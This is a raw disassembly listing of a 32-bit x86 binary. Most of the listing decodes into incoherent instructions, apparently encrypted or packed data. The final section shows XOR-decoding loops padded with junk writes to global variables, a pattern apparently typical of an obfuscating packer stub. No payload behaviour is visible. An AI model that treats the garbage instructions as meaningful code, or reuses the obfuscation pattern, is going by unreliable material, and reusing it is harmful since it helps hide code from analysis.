  403177:	inc    esp
  403178:	shl    DWORD PTR [edi],0xff
  40317b:	imul   edx,DWORD PTR [ebx-0x7b89c239],0x73
  403182:	cwde   
  403183:	jae    0x403113
  403185:	test   DWORD PTR [ebx-0x278ee68c],0x957c9f67
  40318f:	test   eax,0xd9cebb0d
  403194:	or     BYTE PTR [esi+edi*4+0x44],bl
  403198:	(bad)  
  40319a:	mov    esi,0xc31d803e
  40319f:	jp     0x40321e
  4031a1:	xor    BYTE PTR [ebx+0x3e],ch
  4031a4:	repnz loopne 0x4031f9
  4031a7:	jnp    0x40319b
  4031a9:	fs ss mov bh,0xea
  4031ad:	dec    eax
  4031ae:	aam    0x29
  4031b0:	inc    esp
  4031b1:	push   esp
  4031b2:	jae    0x40318d
  4031b4:	jmp    0xd4e46ba1
  4031b9:	fldcw  WORD PTR [ecx-0x17a69d1e]
  4031bf:	stc    
  4031c0:	or     esi,DWORD PTR [ecx]
  4031c2:	push   ds
  4031c3:	fs cmc 
  4031c5:	push   edx
  4031c6:	push   ss
  4031c7:	pop    edx
  4031c8:	xor    eax,esi
  4031ca:	mov    ds:0xcc4efbea,al
  4031cf:	dec    edx
  4031d1:	adc    DWORD PTR es:[edx-0x1d],ebx
  4031d5:	adc    al,BYTE PTR [ecx-0x18]
  4031d8:	dec    ebp
  4031d9:	arpl   WORD PTR [edx+0x11d16988],di
  4031df:	fistp  QWORD PTR [esi-0x35]
  4031e2:	pop    ebx
  4031e3:	sub    BYTE PTR [eax+edi*4-0x76],ah
  4031e7:	adc    cl,BYTE PTR [ebp-0x4e]
  4031ea:	dec    edi
  4031eb:	jnp    0x4031bb
  4031ed:	addr16 push eax
  4031ef:	test   DWORD PTR [ebp-0x19],eax
  4031f2:	in     eax,dx
  4031f3:	lods   al,BYTE PTR ds:[esi]
  4031f4:	sbb    esp,DWORD PTR [edx+0x4a8a2a1]
  4031fa:	jge    0x40326c
  4031fc:	jg     0x40323c
  4031fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ff:	dec    edi
  403200:	push   edx
  403201:	inc    esp
  403202:	sbb    ebp,ecx
  403204:	dec    esi
  403205:	mov    BYTE PTR [edx+0x65],0x26
  403209:	lock stos DWORD PTR es:[edi],eax
  40320b:	rcl    DWORD PTR [edx],cl
  40320d:	pop    gs
  40320f:	stos   DWORD PTR es:[edi],eax
  403210:	or     cl,ah
  403212:	push   ds
  403213:	cld    
  403214:	sbb    ecx,edi
  403216:	adc    ecx,eax
  403218:	pop    ebp
  403219:	fs and eax,0xf0039aea
  40321f:	mov    ds:0x6c977b15,al
  403224:	stos   DWORD PTR es:[edi],eax
  403225:	pavgw  mm0,mm7
  403228:	icebp  
  403229:	jl     0x40325a
  40322b:	xor    al,0x82
  40322d:	sub    ebp,DWORD PTR [ebp-0x5c]
  403230:	shl    bh,1
  403232:	cs enter 0xc3b,0x0
  403237:	inc    esi
  403238:	mov    dh,BYTE PTR [ebp-0x59]
  40323b:	pop    eax
  40323c:	fdiv   QWORD PTR [ecx]
  40323e:	test   BYTE PTR [edx+0x20acf7c1],dl
  403244:	push   esi
  403245:	out    dx,al
  403246:	popa   
  403247:	rcl    BYTE PTR [ebx-0x7c4b50c8],1
  40324d:	and    dh,BYTE PTR [eax+0x5fa02475]
  403253:	jnp    0x4031e4
  403255:	ret    0xa637
  403258:	call   0xa6c3:0x6cf255c
  40325f:	in     eax,0x52
  403261:	mov    edx,0xd3531d52
  403266:	hlt    
  403267:	xchg   ebp,eax
  403268:	jns    0x403299
  40326a:	jmp    0x915e:0xa3fa7260
  403271:	pop    esp
  403272:	jo     0x403286
  403274:	sbb    BYTE PTR [edx],dh
  403276:	mov    BYTE PTR [ecx+edx*1-0x56],bh
  40327a:	mov    ebp,fs
  40327c:	stos   BYTE PTR es:[edi],al
  40327d:	xor    BYTE PTR [ebp-0x6],0x94
  403281:	mov    edi,0x88943fec
  403286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403287:	jae    0x403273
  403289:	fiadd  DWORD PTR [ebp-0x550a9134]
  40328f:	(bad)  
  403290:	fist   DWORD PTR [ebp+0x56]
  403293:	xchg   esp,eax
  403294:	outs   dx,BYTE PTR ds:[esi]
  403295:	fs jne 0x403271
  403298:	and    eax,0xdf5fa05c
  40329d:	ins    BYTE PTR es:[edi],dx
  40329e:	sbb    al,0xe4
  4032a0:	xor    ecx,DWORD PTR [eax-0x49]
  4032a3:	scas   al,BYTE PTR es:[edi]
  4032a4:	mov    dh,0xd6
  4032a6:	inc    edx
  4032a7:	inc    eax
  4032a8:	gs mov eax,0x32fb5e1
  4032ae:	mov    eax,ebx
  4032b0:	xchg   BYTE PTR [esi],cl
  4032b2:	fs ret 
  4032b4:	ror    BYTE PTR [edx+ecx*2+0x2463a378],0x0
  4032bc:	add    al,0x94
  4032be:	add    edx,DWORD PTR [edx-0x71]
  4032c1:	or     BYTE PTR [ebp-0x1154a85d],al
  4032c7:	stos   DWORD PTR es:[edi],eax
  4032c8:	in     al,0xb
  4032ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032cb:	cdq    
  4032cc:	mov    bh,0xe
  4032ce:	jecxz  0x40326f
  4032d0:	pop    ds
  4032d1:	mov    esp,0xd784fcc3
  4032d6:	stos   BYTE PTR es:[edi],al
  4032d7:	scas   al,BYTE PTR es:[edi]
  4032d8:	sub    eax,0x2ebeb629
  4032dd:	mov    dl,0xc9
  4032df:	in     al,0x14
  4032e1:	leave  
  4032e2:	(bad)  
  4032e3:	or     eax,0xb90281a6
  4032e8:	mov    bl,0x81
  4032ea:	add    edx,DWORD PTR [ebx-0x3532bdec]
  4032f0:	dec    ebx
  4032f1:	cmp    esi,DWORD PTR [ebp-0x6adfbfae]
  4032f7:	aam    0x48
  4032f9:	adc    eax,0x916ac3d3
  4032fe:	loopne 0x403366
  403300:	retf   
  403301:	nop
  403302:	shl    BYTE PTR [eax-0x15],1
  403305:	bswap  ebp
  403307:	fs pusha 
  403309:	fmul   DWORD PTR [eax]
  40330b:	pop    edi
  40330c:	je     0x4032ab
  40330e:	or     al,cl
  403310:	pop    esp
  403311:	and    ecx,ebx
  403313:	pushf  
  403314:	ins    DWORD PTR es:[edi],dx
  403315:	cmovne ecx,DWORD PTR [eax-0x36a650b6]
  40331c:	fiadd  WORD PTR [ebp-0x319a784d]
  403322:	leave  
  403323:	inc    esi
  403324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403325:	xchg   edi,eax
  403326:	mov    bh,0xaf
  403328:	out    dx,al
  403329:	sub    bh,BYTE PTR [ebp+0x6f8dd48e]
  40332f:	inc    ebp
  403330:	push   0xffffff9f
  403332:	jmp    0x403357
  403334:	push   ds
  403335:	pop    eax
  403336:	lock sub DWORD PTR [edx-0x3f],esi
  40333a:	dec    eax
  40333b:	sar    BYTE PTR [eax-0x189e5ad6],cl
  403341:	mov    bh,0xab
  403343:	out    0x61,eax
  403345:	push   ebx
  403346:	ja     0x403329
  403348:	or     edi,DWORD PTR [ebx+edi*4-0xd8f9ec]
  40334f:	or     ch,BYTE PTR [esi+0x2]
  403352:	and    bh,bh
  403354:	and    BYTE PTR [eax],dh
  403356:	cdq    
  403357:	scas   eax,DWORD PTR es:[edi]
  403358:	mov    ebp,0x52a8d16f
  40335d:	push   edx
  40335e:	enter  0x748c,0xb3
  403362:	mov    dl,0x8d
  403364:	mov    ebp,0xb4990b9a
  403369:	pusha  
  40336a:	pop    esp
  40336b:	in     al,dx
  40336c:	sti    
  40336d:	pop    ebx
  40336e:	int3   
  40336f:	adc    BYTE PTR [eax+0x4d],ah
  403372:	push   ss
  403373:	or     edx,0x60
  403376:	inc    esp
  403377:	inc    edi
  403378:	cld    
  403379:	adc    ebx,DWORD PTR [ebx-0x1e3ce8ef]
  40337f:	cmc    
  403380:	das    
  403381:	test   eax,0x89afd065
  403386:	sub    al,0xcd
  403388:	sub    DWORD PTR [ecx],ebp
  40338a:	outs   dx,BYTE PTR ds:[esi]
  40338b:	mov    BYTE PTR [ebp-0x11],0x80
  40338f:	fsubp  st(1),st
  403391:	jmp    0xa13440bd
  403396:	dec    esp
  403397:	xchg   edx,eax
  403398:	cwde   
  403399:	stos   DWORD PTR es:[edi],eax
  40339a:	cmp    BYTE PTR [esi+0x41844b1b],bl
  4033a0:	mov    fs,WORD PTR [edi-0x5bff3744]
  4033a6:	retf   0x5eeb
  4033a9:	sub    dl,BYTE PTR [edi-0x4]
  4033ac:	test   BYTE PTR [ebp-0x13b539da],dl
  4033b2:	inc    edx
  4033b3:	fwait
  4033b4:	mov    ch,0x62
  4033b6:	inc    eax
  4033b7:	xchg   ebp,eax
  4033b8:	inc    esi
  4033b9:	push   edx
  4033ba:	cdq    
  4033bb:	or     BYTE PTR [edx],dh
  4033bd:	call   0xf05fc798
  4033c2:	sub    ebp,DWORD PTR [ecx+0x577ba4de]
  4033c8:	neg    esp
  4033ca:	pop    edi
  4033cb:	lods   al,BYTE PTR ds:[esi]
  4033cc:	mov    edi,0x72a3adf8
  4033d1:	je     0x403406
  4033d3:	inc    esp
  4033d4:	and    DWORD PTR [edi+0x72],esi
  4033d7:	cmp    esi,ebp
  4033d9:	xchg   ecx,eax
  4033da:	mov    ecx,esp
  4033dc:	test   al,0x36
  4033de:	mov    bh,0x1f
  4033e0:	clc    
  4033e1:	pop    es
  4033e2:	(bad)  
  4033e4:	xor    ch,BYTE PTR [ebx+0x1f]
  4033e7:	shl    DWORD PTR gs:[edi+0x60],cl
  4033eb:	adc    ebp,edx
  4033ed:	outs   dx,DWORD PTR ds:[esi]
  4033ee:	mov    BYTE PTR [eax-0x1d],dh
  4033f1:	jmp    0x4033e6
  4033f3:	mov    ecx,0x232bbd1e
  4033f8:	inc    BYTE PTR [ecx+ebp*8-0x2553619d]
  4033ff:	sbb    dh,BYTE PTR [edx+0x70]
  403402:	les    ebx,FWORD PTR [eax]
  403404:	fild   DWORD PTR [edx+edi*8-0x1b3a4758]
  40340b:	jae    0x40345c
  40340d:	call   0x4ab8554f
  403412:	mov    ebx,0x8d16e605
  403417:	cmp    BYTE PTR [edi-0x49],ah
  40341a:	and    al,0x7a
  40341c:	stc    
  40341d:	lods   eax,DWORD PTR ds:[esi]
  40341e:	sahf   
  40341f:	jg     0x4033c8
  403421:	cmp    BYTE PTR [edi],ch
  403423:	popf   
  403424:	jge    0x403474
  403426:	int3   
  403427:	jmp    0x403452
  403429:	in     al,0x96
  40342b:	scas   al,BYTE PTR es:[edi]
  40342c:	and    ebx,ebp
  40342e:	dec    ebp
  40342f:	jl     0x403499
  403431:	dec    ecx
  403432:	xchg   edi,eax
  403433:	fcmovne st,st(7)
  403435:	fisubr WORD PTR [edx+0x45927af7]
  40343b:	mov    ecx,0x171f5076
  403440:	jo     0x40349c
  403442:	ret    
  403443:	dec    esp
  403444:	mov    ds:0x9a9076d2,eax
  403449:	mov    dh,0xbb
  40344b:	das    
  40344c:	stos   BYTE PTR es:[edi],al
  40344d:	stos   BYTE PTR es:[edi],al
  40344e:	push   ss
  40344f:	call   0x583b:0xae6ba4f
  403456:	(bad)  
  403457:	mov    cl,0x42
  403459:	cmp    ah,BYTE PTR [edi-0x6e]
  40345c:	push   cs
  40345d:	cmc    
  40345e:	sub    al,0x8f
  403460:	mov    esi,0x84acbd27
  403465:	rol    DWORD PTR [ecx],cl
  403467:	cdq    
  403468:	and    ah,BYTE PTR ds:0x72ae4456
  40346e:	jl     0x4034bf
  403470:	adc    eax,0xea86cee3
  403475:	daa    
  403476:	cld    
  403477:	int3   
  403478:	mov    ds:0x63bff0c2,al
  40347d:	or     eax,0x9b4af117
  403482:	rcl    DWORD PTR [ecx-0x2a],cl
  403485:	jbe    0x40342c
  403487:	cmp    al,0xd6
  403489:	fstp   QWORD PTR [ecx+0x1a]
  40348c:	ret    
  40348d:	fs jg  0x4034cc
  403490:	push   ds
  403491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403492:	fild   DWORD PTR [eax]
  403494:	mov    eax,DWORD PTR ds:0xa0099a19
  40349a:	imul   esp,DWORD PTR [ecx],0xf57d026f
  4034a0:	in     al,dx
  4034a1:	xchg   edi,eax
  4034a2:	cs xchg ecx,eax
  4034a4:	stos   DWORD PTR es:[edi],eax
  4034a5:	cmc    
  4034a6:	enter  0xc622,0xe2
  4034aa:	jmp    0x4034f4
  4034ac:	arpl   si,bx
  4034ae:	imul   edi,DWORD PTR ds:0xe5f10d54,0x3f470e34
  4034b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034b9:	ds dec eax
  4034bb:	cmp    bl,0x7c
  4034be:	dec    ebp
  4034bf:	jo     0x4034ef
  4034c1:	sbb    eax,0x3c14536d
  4034c6:	fmul   QWORD PTR ds:0xb23ed72d
  4034cc:	or     al,0x58
  4034ce:	call   0x3ff74e50
  4034d3:	outs   dx,BYTE PTR ds:[esi]
  4034d4:	test   BYTE PTR [eax+0x4e],bl
  4034d7:	and    ecx,DWORD PTR [ebp-0x3ee7e739]
  4034dd:	adc    edi,DWORD PTR [ebp-0x7e]
  4034e0:	xchg   esp,eax
  4034e1:	ins    BYTE PTR es:[edi],dx
  4034e2:	adc    esi,edi
  4034e4:	push   esp
  4034e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e6:	jp     0x40347b
  4034e8:	lahf   
  4034e9:	out    0x9e,eax
  4034eb:	xchg   ebx,eax
  4034ec:	test   BYTE PTR [eax],0xb8
  4034ef:	jg     0x4034d8
  4034f1:	dec    esp
  4034f2:	add    eax,0x3f64b231
  4034f7:	jl     0x403574
  4034f9:	retf   
  4034fa:	adc    al,0xe7
  4034fc:	jae    0x4034f6
  4034fe:	out    dx,al
  4034ff:	fimul  DWORD PTR [ecx+0x549c23e2]
  403505:	inc    ecx
  403506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403507:	mov    ebx,0x5b56cfb7
  40350c:	cs mov bh,0x84
  40350f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403510:	inc    esi
  403511:	cmc    
  403512:	mov    edx,0xb411a4b0
  403517:	cld    
  403518:	dec    edi
  40351a:	dec    edx
  40351b:	call   0x5b35ea80
  403520:	mov    ds:0x890b7212,al
  403525:	icebp  
  403526:	fs xor eax,ecx
  403529:	pop    esi
  40352a:	jmp    0xd98c:0xaa1e882b
  403531:	les    esp,FWORD PTR [ebp+0x77]
  403534:	leave  
  403535:	mov    esp,0x3de6cd05
  40353a:	in     eax,dx
  40353b:	arpl   ax,di
  40353d:	out    0x1f,eax
  40353f:	pop    ecx
  403540:	imul   edx,DWORD PTR [eax+0x63],0x37
  403544:	call   DWORD PTR [edi+0x43]
  403547:	imul   ecx,esi,0xca535ead
  40354d:	test   ebp,esi
  40354f:	adc    ebx,DWORD PTR [edx-0x727a112c]
  403555:	cmp    BYTE PTR [eax+esi*1],ch
  403558:	and    BYTE PTR [esi+esi*8-0x60fc1863],bh
  40355f:	or     ch,BYTE PTR ds:0x9899fcbc
  403565:	or     eax,0xc382766a
  40356a:	jb     0x40355f
  40356c:	std    
  40356d:	popa   
  40356e:	push   0x6425dac3
  403573:	scas   eax,DWORD PTR es:[edi]
  403574:	gs scas al,BYTE PTR es:[edi]
  403576:	stos   DWORD PTR es:[edi],eax
  403577:	mul    esi
  403579:	ds cmp al,dl
  40357c:	ja     0x403529
  40357e:	int3   
  40357f:	push   edx
  403580:	xchg   ebx,eax
  403581:	ja     0x403553
  403583:	mov    ds:0xe67ee29,eax
  403588:	add    DWORD PTR [ebx-0x4813b56c],eax
  40358e:	loope  0x4035a6
  403590:	es stos DWORD PTR es:[edi],eax
  403592:	pop    edx
  403593:	xchg   edx,eax
  403594:	lea    ebx,[edi]
  403596:	jbe    0x403548
  403598:	test   BYTE PTR [edx-0x5c],ch
  40359b:	mov    eax,ds:0xa4fb06ee
  4035a0:	inc    edi
  4035a1:	jle    0x403555
  4035a3:	ins    DWORD PTR es:[edi],dx
  4035a4:	cli    
  4035a5:	ficomp DWORD PTR [edx-0x2]
  4035a8:	clc    
  4035a9:	mov    ebx,0x32a7e0e8
  4035ae:	pop    edi
  4035af:	daa    
  4035b0:	inc    edi
  4035b1:	sbb    BYTE PTR [edx+eiz*8+0x2c3b9522],bl
  4035b8:	ins    BYTE PTR es:[edi],dx
  4035b9:	adc    DWORD PTR [edx+0x33f7e4d9],0xbfcc2b33
  4035c3:	cdq    
  4035c4:	jecxz  0x40356b
  4035c6:	cdq    
  4035c7:	imul   esp,DWORD PTR [ecx],0xffffff82
  4035ca:	and    dh,BYTE PTR [eax-0x41715bda]
  4035d0:	dec    eax
  4035d1:	push   DWORD PTR [ebp+0x4]
  4035d4:	lea    edi,[edx+edx*1-0x7f07052f]
  4035db:	push   ebp
  4035dc:	out    dx,al
  4035dd:	fsub   QWORD PTR [eax-0x2f]
  4035e0:	outs   dx,DWORD PTR ds:[esi]
  4035e1:	js     0x403626
  4035e3:	mov    edx,0x51b8cc81
  4035e8:	push   es
  4035e9:	test   al,0xc2
  4035eb:	pop    ds
  4035ec:	push   es
  4035ed:	fsubr  st(7),st
  4035ef:	pop    eax
  4035f0:	imul   edx,DWORD PTR [edx-0x2a],0x712827e0
  4035f7:	call   0xef338294
  4035fc:	adc    DWORD PTR [ecx],0x47db0b64
  403602:	test   ebp,ebx
  403604:	lods   al,BYTE PTR ds:[esi]
  403605:	call   0xc639:0x1ff6a28e
  40360c:	fst    DWORD PTR [ebp+eax*1-0x6b11ef15]
  403613:	sahf   
  403614:	popa   
  403615:	jno    0x403612
  403617:	pop    ss
  403618:	adc    cl,cl
  40361a:	and    al,0x50
  40361c:	sbb    ecx,ebp
  40361e:	mov    ah,0x96
  403620:	leave  
  403621:	(bad)  
  403622:	cs out dx,al
  403624:	into   
  403625:	je     0x40367b
  403627:	mov    edx,0xffb61421
  40362c:	into   
  40362d:	imul   ebp,DWORD PTR [ecx],0x39
  403630:	sub    ch,BYTE PTR [ecx+0x52c4c2f3]
  403636:	mov    ah,0xe0
  403638:	add    al,0x7f
  40363a:	mov    esp,0x435cda0a
  40363f:	pop    edx
  403640:	adc    dl,0x29
  403643:	jl     0x40361f
  403645:	jbe    0x403665
  403647:	nop
  403648:	cwde   
  403649:	shr    BYTE PTR [eax+eiz*1+0x20ed468b],0x76
  403651:	in     eax,dx
  403652:	cli    
  403653:	mov    al,ds:0x764bd50c
  403658:	sub    eax,DWORD PTR [ebx]
  40365a:	pop    ebp
  40365b:	dec    ecx
  40365c:	cmp    al,0x17
  40365e:	and    al,0x1a
  403660:	mov    ch,0x9
  403662:	cmc    
  403663:	sbb    DWORD PTR [esi],esp
  403665:	adc    dl,BYTE PTR [edx]
  403667:	(bad)  
  403668:	aas    
  403669:	cmp    edi,DWORD PTR [edi+edx*8-0x3022c18a]
  403670:	jb     0x4036e8
  403672:	mov    al,ds:0x98edab8c
  403677:	ret    
  403678:	out    0x56,eax
  40367a:	mov    DWORD PTR [eax-0x178f71af],edx
  403680:	cmp    eax,0xb5e5e83
  403685:	cmp    al,0xf0
  403687:	add    ah,cl
  403689:	outs   dx,BYTE PTR ds:[esi]
  40368a:	mov    al,ds:0x88a5f084
  40368f:	and    al,0x1e
  403691:	jmp    0x22f0:0x50fd612f
  403698:	xor    al,0xc6
  40369a:	jo     0x403637
  40369c:	stos   BYTE PTR es:[edi],al
  40369d:	(bad)  
  40369e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40369f:	push   0xb0e1f82b
  4036a4:	out    dx,eax
  4036a5:	push   ebx
  4036a6:	icebp  
  4036a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a8:	out    dx,al
  4036a9:	pusha  
  4036aa:	popa   
  4036ab:	test   eax,0x3dbc97e4
  4036b0:	jnp    0x4036e8
  4036b2:	popf   
  4036b3:	aad    0xa8
  4036b5:	xor    bl,BYTE PTR [ebx-0x7]
  4036b8:	cmp    esi,DWORD PTR [ebx+0xe45b7b0]
  4036be:	adc    ebx,DWORD PTR [edx-0x7790bca2]
  4036c4:	lock xlat BYTE PTR ds:[ebx]
  4036c6:	in     eax,dx
  4036c7:	(bad)  {k6}
  4036cc:	cmp    BYTE PTR [ebx+0x6273b96e],bl
  4036d2:	ins    DWORD PTR es:[edi],dx
  4036d3:	mov    cl,BYTE PTR [ecx+0x545d377f]
  4036d9:	frstor [esi+0x663dfb49]
  4036df:	dec    eax
  4036e0:	cdq    
  4036e1:	and    DWORD PTR [edx-0x7260d07],esp
  4036e7:	or     eax,0x9e882334
  4036ec:	jb     0x403737
  4036ee:	mov    dh,0xa
  4036f0:	xlat   BYTE PTR ds:[ebx]
  4036f1:	mov    edx,0xd8b6feb8
  4036f6:	test   esi,0x79597b59
  4036fc:	sub    eax,0xc1fcf0fb
  403701:	sub    al,0x67
  403703:	xor    al,0xce
  403705:	or     eax,0x493bc75c
  40370a:	aaa    
  40370b:	dec    edi
  40370c:	adc    BYTE PTR [edx-0x2e],0x17
  403710:	add    DWORD PTR [edi],edi
  403712:	imul   ebx,esi,0xffffffb2
  403715:	call   0x28837e62
  40371a:	sub    al,0xc
  40371c:	and    eax,0x184ee460
  403721:	sbb    dl,BYTE PTR [edi+ebx*1]
  403724:	scas   al,BYTE PTR es:[edi]
  403725:	sub    eax,0x7ae32cf1
  40372a:	sub    bl,bh
  40372c:	mov    WORD PTR [ebp-0x55aaa694],fs
  403732:	sbb    BYTE PTR [esi-0x29],ch
  403735:	lock push ebx
  403737:	or     ecx,DWORD PTR [edx*1+0x2fd5a1c3]
  40373e:	imul   ecx,edi,0xffffffd1
  403741:	jmp    0x40374a
  403743:	addr16 jbe 0x40377d
  403746:	push   0x4d526640
  40374b:	sbb    esp,ebp
  40374d:	cmp    al,0xe0
  40374f:	aad    0x49
  403751:	or     bh,BYTE PTR [edi-0x59]
  403754:	fwait
  403755:	jmp    0x4036f9
  403757:	cmp    BYTE PTR [esi+ebp*1-0x29],dl
  40375b:	daa    
  40375c:	jbe    0x4037c8
  40375e:	lods   al,BYTE PTR ds:[esi]
  40375f:	(bad)  
  403760:	rcl    BYTE PTR [ebp+0x34],0x37
  403764:	scas   al,BYTE PTR es:[edi]
  403765:	(bad)  
  403767:	mov    cl,BYTE PTR [edx+edi*2]
  40376a:	push   es
  40376b:	shl    DWORD PTR [ebx+0x2e],1
  40376e:	test   bh,cl
  403770:	dec    edx
  403771:	inc    edi
  403772:	jmp    0xe136:0xc630f556
  403779:	mov    esi,0xf40bc685
  40377e:	pop    ebp
  40377f:	add    cl,BYTE PTR [ebx+0x43]
  403782:	pusha  
  403783:	shr    DWORD PTR [eax-0x3521578d],1
  403789:	ficom  WORD PTR [eax-0x32]
  40378c:	pop    ecx
  40378d:	ret    
  40378e:	adc    al,ah
  403790:	push   0xffffffec
  403792:	iret   
  403793:	mov    edi,0xe2013ecd
  403798:	push   es
  403799:	retf   
  40379a:	push   ebp
  40379b:	adc    edi,DWORD PTR [ebx+0x2cfde04e]
  4037a1:	cdq    
  4037a2:	loop   0x403793
  4037a4:	add    BYTE PTR [ecx+0x43],bl
  4037a7:	cli    
  4037a8:	(bad)  [edx]
  4037aa:	loop   0x403741
  4037ac:	dec    edx
  4037ad:	add    bh,BYTE PTR [ecx]
  4037af:	jbe    0x403795
  4037b1:	mov    bl,0x53
  4037b3:	scas   al,BYTE PTR es:[edi]
  4037b4:	and    eax,0x28b38ccc
  4037b9:	(bad)  
  4037ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037bb:	or     eax,0x6cc9959b
  4037c0:	jmp    0x40379b
  4037c2:	fstp   TBYTE PTR [ebx+0x5d82e779]
  4037c8:	cmp    ebx,ebx
  4037ca:	xlat   BYTE PTR ds:[ebx]
  4037cb:	addr16 test al,0x77
  4037ce:	stc    
  4037cf:	or     ch,ah
  4037d1:	ins    DWORD PTR es:[edi],dx
  4037d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d3:	in     eax,0x77
  4037d5:	scas   al,BYTE PTR es:[edi]
  4037d6:	ds inc eax
  4037d8:	gs sbb ah,ch
  4037db:	cmp    BYTE PTR [edi+ecx*8-0x76],0x85
  4037e0:	enter  0x75e5,0x37
  4037e4:	sbb    DWORD PTR [ebx-0x3d],0xf7761682
  4037eb:	mov    edi,0xa6c34dc3
  4037f0:	cmp    DWORD PTR [edx+0x481b096d],0xb885fcaa
  4037fa:	mul    DWORD PTR [edx+edi*4-0xf]
  4037fe:	aaa    
  4037ff:	rcr    cl,cl
  403801:	or     eax,0x5c0fc9c0
  403806:	add    al,0x8e
  403808:	mov    BYTE PTR [esp+ebp*2+0x65],dh
  40380c:	push   eax
  40380d:	mov    DWORD PTR [edi],ecx
  40380f:	fidivr DWORD PTR [edx-0x4d]
  403812:	mov    ds:0x458bca1f,al
  403817:	lock mov ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42aa2b
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42aa2f
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
